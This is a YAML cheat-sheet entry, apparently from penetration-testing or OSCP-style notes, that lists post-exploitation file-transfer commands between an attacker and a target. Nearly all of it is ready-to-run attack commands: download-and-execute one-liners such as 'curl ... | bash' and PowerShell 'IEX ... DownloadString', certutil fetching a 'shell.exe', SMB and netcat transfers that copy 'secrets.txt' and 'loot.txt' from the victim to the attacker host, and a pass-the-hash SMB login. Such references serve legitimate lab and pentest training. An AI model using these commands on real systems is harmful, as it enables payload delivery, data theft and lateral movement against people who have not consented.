---
description: |
  Transfer files between attacker and target using HTTP servers, wget, curl, PowerShell, certutil, SMB, SCP, netcat, base64 encoding, and RDP drive sharing.
command: |
  # --- HTTP Server (Attacker) ---
  python3 -m http.server 80

  # --- Linux Download ---
  wget http://10.10.10.21/linpeas.sh -O /tmp/linpeas.sh
  curl http://10.10.10.21/linpeas.sh -o /tmp/linpeas.sh
  curl http://10.10.10.21/linpeas.sh | bash

  # --- Windows PowerShell ---
  Invoke-WebRequest -Uri http://10.10.10.21/winpeas.exe -OutFile C:\Temp\winpeas.exe
  (New-Object Net.WebClient).DownloadFile('http://10.10.10.21/shell.exe','C:\Temp\shell.exe')
  IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.21/script.ps1')

  # --- Certutil ---
  certutil -urlcache -split -f http://10.10.10.21/shell.exe C:\Temp\shell.exe

  # --- SMB Server (Attacker Host) ---
  impacket-smbserver share $(pwd) -smb2support
  impacket-smbserver share $(pwd) -smb2support -user sec_user -password P@ssw0rd
  # --- Connect from Windows Target Host ---
  # If auth required, connect first:
  net use \\10.10.10.21\share /user:sec_user P@ssw0rd
  copy \\10.10.10.21\share\shell.exe C:\Temp\shell.exe (kali to victim)
  copy C:\Users\sec_user\Desktop\secrets.txt \\10.10.10.21\share\secrets.txt (victim to kali)
  
  # --- SMB Client / Internal Target Interaction (e.g., via Ligolo pivot) ---
  # Connect with NTLM Hash (Pass-the-Hash) directly from Kali to internal target
  impacket-smbclient -hashes :4979d69d4ca66955c075c41cf45f24dc oscp/tom_admin@10.10.195.142
  # with password
  impacket-smbclient oscp/tom_admin:P@ssw0rd@10.10.195.142
  # Common interactive commands once inside smbclient:
  #   shares        - List available shares
  #   use <share>   - Switch to a share
  #   ls / cd       - Navigate directories
  #   get <file>    - Download file from target to Kali
  #   put <file>    - Upload file from Kali to target
  
  # --- SCP ---
  scp linpeas.sh sec_user@10.10.10.27:/tmp/linpeas.sh
  scp sec_user@10.10.10.27:/tmp/loot.txt ./loot.txt

  # --- Netcat ---
  nc -lvnp 1234 > file
  nc 10.10.10.21 1234 < file

  # --- Base64 (no transfer needed) ---
  base64 -w 0 /tmp/secret.txt
  echo "BASE64_STRING" | base64 -d > secret.txt

  # --- xfreerdp drive sharing ---
  xfreerdp /v:10.10.10.27 /u:sec_user /p:'P@ssw0rd' /drive:share,/tmp/tools
  # Access in RDP: \\tsclient\share
items:
  - Shell
phase:
  - Post-Exploitation
target_os:
  - Linux
  - Windows
services: []
techniques: []
references:
  - https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration
---
